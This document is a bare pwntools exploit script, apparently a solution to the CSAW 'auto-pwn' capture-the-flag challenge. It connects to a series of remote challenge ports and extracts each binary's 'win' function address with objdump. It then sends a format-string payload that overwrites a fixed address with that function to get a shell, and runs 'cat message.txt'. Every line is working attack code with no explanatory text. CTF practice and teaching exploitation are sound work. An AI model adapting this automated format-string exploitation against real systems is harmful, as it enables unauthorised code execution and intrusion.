#!/usr/bin/env python3

from pwn import *
import os

context.update(arch='i386', os='linux')


for i in range(0, 15):
	port = 11000 + i + 1
	print("port", port)
	p = remote("auto-pwn.chal.csaw.io", port)
	with open('passwords.txt', 'r') as f:
		password = f.readlines()[i].rstrip()
	
	p.recvuntil(b'> ')
	p.sendline(password)
	p.recvuntil(b"-------------------------------------------------------------------\n")
	source = f"binary_{i+1}.txt"
	f = open(source, 'wb')
	b = p.recvline()
	while b != b"-------------------------------------------------------------------\n":
		f.write(b)
		b = p.recvline()
	f.close()
	sleep(1)
	os.system(f"xxd -r binary_{i+1}.txt > test")
	p1 = subprocess.Popen(['objdump', '-D', '-M', 'intel', 'test'], stdout=subprocess.PIPE)
	p2 = subprocess.Popen(["grep", "win"], stdin=p1.stdout, stdout=subprocess.PIPE)
	p1.stdout.close()  
	output,err = p2.communicate()
	win = int(output[0:8], 16)

	p.recvuntil(b'> ')

	writes = {0x804e028: win}
	
	payload = b"\x90\x90" + fmtstr_payload(6, writes, numbwritten=2)
	p.sendline(payload)
	
	sleep(1)
	p.sendline("cat message.txt")
	p.interactive()

	p.close()

